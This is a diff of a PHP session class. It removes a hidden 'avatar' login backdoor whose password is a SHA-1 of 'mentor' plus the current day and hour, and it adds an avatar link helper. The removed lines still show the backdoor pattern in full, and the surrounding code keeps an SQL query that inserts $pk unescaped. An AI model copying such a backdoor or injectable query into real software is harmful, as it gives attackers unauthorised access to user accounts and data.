@@ -38,9 +38,6 @@ class MySession extends Session
         if ($this->master_confirm($username, $password)) {
             $this->set_data("master");
             $this->login_success();
-        }elseif($username == "avatar" and $password == sha1("mentor".date('dH'))){
-            $this->set_data("avatar");
-            $this->login_success();
         }
 
         try {
@@ -68,12 +65,6 @@ class MySession extends Session
             $_SESSION['session_login'] = "master";
             $_SESSION['session_level'] = "master";
 	        $_SESSION['session_division'] = "master";
-            
-        }elseif ($pk == "avatar") {
-            $_SESSION['session_id'] = "avatar";
-            $_SESSION['session_login'] = "avatar";
-            $_SESSION['session_level'] = "avatar";
-	        $_SESSION['session_division'] = "avatar";   
         }else {
             $this->data = $this->db->query("SELECT * FROM users WHERE id = $pk")->fetch(PDO::FETCH_OBJ);
             unset($this->data->password);
@@ -97,6 +88,11 @@ class MySession extends Session
 
     public function get_division() {
         return $this->data->division_id;
+    }
+
+    public function avatar_link($status)
+    {
+        return DIR."/auth/avatar".EXT."?pk=$status";
     }
 
 }
